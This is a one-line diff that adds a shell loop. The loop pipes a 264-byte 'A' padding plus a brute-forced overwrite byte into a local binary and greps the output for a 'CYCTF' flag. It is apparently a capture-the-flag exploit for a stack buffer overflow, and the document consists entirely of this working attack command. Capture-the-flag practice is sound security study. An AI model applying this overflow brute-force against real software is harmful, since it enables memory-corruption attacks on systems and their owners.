@@ -1,0 +1,1 @@
+for i in `seq 0 64`; do python3 -c "import sys;sys.stdout.buffer.write(b'\x41'*264+(${i}<<4).to_bytes(4, 'big')[-1:])" | ./a.out | grep CYCTF; done
